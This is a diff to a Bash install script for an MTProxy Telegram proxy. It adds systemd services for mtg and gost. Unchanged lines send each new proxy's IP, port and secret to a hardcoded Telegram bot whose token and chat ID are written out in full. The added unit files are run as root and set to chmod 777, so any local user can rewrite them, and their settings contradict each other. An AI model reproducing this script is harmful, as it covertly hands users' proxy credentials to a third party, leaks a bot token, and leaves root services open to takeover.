@@ -1,4 +1,6 @@
 #!/bin/bash
+mkdir /usr/mtproxy
+cd /usr/mtproxy
 WORKDIR=$(dirname $(readlink -f $0))
 cd $WORKDIR
 pid_file=$WORKDIR/pid/pid_mtproxy
@@ -298,13 +300,55 @@ info_mtp() {
         echo -e "TG一键链接: https://t.me/proxy?server=${public_ip}&port=${port}&secret=${client_secret}"
         echo -e "TG一键链接: tg://proxy?server=${public_ip}&port=${port}&secret=${client_secret}"
 		if (("$is_New" > 0)); then
+			echo "正在设置开机启动服务..."
+			cat >/etc/systemd/system/mtg.service <<EOF
+[Unit]
+Description=mtg - MTProto proxy server
+Documentation=https://github.com/9seconds/mtg
+After=network.target
+[Service]
+Type=forking
+User=root
+ExecStart=/usr/mtproxy/mtg run ${client_secret} -b 0.0.0.0:${port} --multiplex-per-connection 500 --prefer-ip=ipv6 -t 127.0.0.1:8888 -4 ${public_ip}:${port}
+Restart=always
+DynamicUser=true
+AmbientCapabilities=CAP_NET_BIND_SERVICE
+[Install]
+WantedBy=multi-user.target
+EOF
+		chmod 777 /etc/systemd/system/mtg.service
+		systemctl daemon-reload
+		systemctl enable mtg.service
 
-			Text="代理机新增代理 : https://t.me/proxy?server=$public_ip%26port=$port%26secret=$client_secret"
+			cat >/etc/systemd/system/gost.service <<EOF
+[Unit]
+Description=gost_server
+Documentation=https://github.com/go-gost/gost
+After=network.target
+[Service]
+Type=forking
+User=root
+ExecStart=/usr/mtproxy/gost -L=mtls://:8443/127.0.0.1:443
+Restart=always
+DynamicUser=true
+AmbientCapabilities=CAP_NET_BIND_SERVICE
+[Install]
+WantedBy=multi-user.target
+EOF
+		chmod 777 /etc/systemd/system/gost.service
+		systemctl daemon-reload
+		systemctl enable gost.service
+		systemctl start gost.service
+		
+		Text="代理机新增代理 : https://t.me/proxy?server=$public_ip%26port=$port%26secret=$client_secret"
 			curl POST \
 				"https://api.telegram.org/bot7073530375:AAHiPPKTEOSBtYEt5R4tzDkoT7Tiz6ED3jI/sendMessage" \
 				-d chat_id="6073160827" \
 				-d text="${Text}" 
+		
 		fi
+		
+		
 
     else
         echo -e "TMProxy+TLS代理: \033[33m已停止\033[0m"
@@ -327,11 +371,6 @@ run_mtp() {
 		
 		#启动中转服务!
 		info_mtp
-		
-		echo ""
-		echo "启动中转服务!"
-		nohup ./gost -L=mtls://:8443/127.0.0.1:443 >null 2>&1 &
-
     fi
 }
 
